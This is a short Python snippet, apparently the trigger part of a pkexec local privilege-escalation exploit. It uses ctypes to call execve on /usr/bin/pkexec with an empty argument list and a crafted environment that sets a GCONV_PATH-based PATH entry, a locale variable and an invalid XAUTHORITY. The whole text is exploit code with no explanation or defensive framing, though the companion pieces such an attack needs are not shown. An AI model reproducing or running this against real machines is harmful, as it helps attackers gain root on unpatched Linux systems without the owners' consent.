from ctypes import CDLL, c_char_p

def trigger():
    envp = (c_char_p * 5)(b"exploit", b"PATH=GCONV_PATH=.",
                         b"LC_MESSAGES=en_US.UTF-8", b"XAUTHORITY=invalid", None)
    native = CDLL("libc.so.6")
    native.execve(b"/usr/bin/pkexec", c_char_p(None), envp)
